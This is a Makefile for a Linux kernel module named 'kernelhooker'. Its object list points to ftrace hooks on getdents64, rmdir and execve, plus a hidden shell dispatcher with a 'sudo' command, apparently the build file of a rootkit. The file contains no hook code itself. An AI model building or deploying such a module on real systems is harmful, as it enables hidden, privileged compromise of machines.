MODULE_NAME := kernelhooker

SRC_DIR := src
BUILD_DIR := build
DIST_DIR := dist

obj-m += $(MODULE_NAME).o
$(MODULE_NAME)-objs := src/inc/ftrace/ftrace_helper.o src/inc/logger/logger.o src/inc/hooks/utils.o src/inc/hooks/getdents64/getdents64.o src/inc/hooks/rmdir/rmdir.o src/inc/hooks/execve/execve.o src/inc/shell/dispatcher.o src/inc/shell/parser/parser.o src/inc/shell/commands/sudo/sudo.o src/entry.o

KBUILD_CFLAGS += -DDEBUG=1

JOBS := $(shell nproc)
KDIR := /lib/modules/$(shell uname -r)/build

.PHONY: all
all: modules

.PHONY: rebuild
rebuild: clean modules

.PHONY: modules
modules:
	$(MAKE) -j$(JOBS) -C $(KDIR) M=$(CURDIR) MO=$(CURDIR)/$(BUILD_DIR) modules

.PHONY: clean
clean:
	$(MAKE) -j$(JOBS) -C $(KDIR) M=$(CURDIR) MO=$(CURDIR)/$(BUILD_DIR) clean
